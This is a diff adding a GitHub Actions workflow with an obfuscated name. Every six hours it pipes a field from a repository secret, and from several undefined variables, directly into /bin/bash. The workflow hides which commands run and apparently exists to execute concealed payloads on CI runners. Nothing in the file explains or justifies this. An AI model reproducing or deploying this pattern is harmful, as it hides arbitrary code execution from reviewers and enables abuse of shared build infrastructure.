@@ -1,0 +1,27 @@
+name: zhuanxiagjiaozhou
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '1 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhuanxiagjiaozhou
+        env:
+          yn66694: ${{ secrets.yn66694 }}
+        run: |
+          echo $yn66694 | jq -r .ejf1 | /bin/bash
+          echo $ekiyh8474 | jq -r .kpzo3 | /bin/bash
+          echo $i76336 | jq -r .dynaa47886 | /bin/bash
+          echo $gab88848 | jq -r .sy4 | /bin/bash
+          echo $hh92368 | jq -r .lhmr7 | /bin/bash
+          echo $l237 | jq -r .u25 | /bin/bash
+          echo $win301 | jq -r .qliqd784 | /bin/bash
+          echo $xbxt073 | jq -r .khn105 | /bin/bash
+          echo $bugoy44149 | jq -r .sh5 | /bin/bash
+
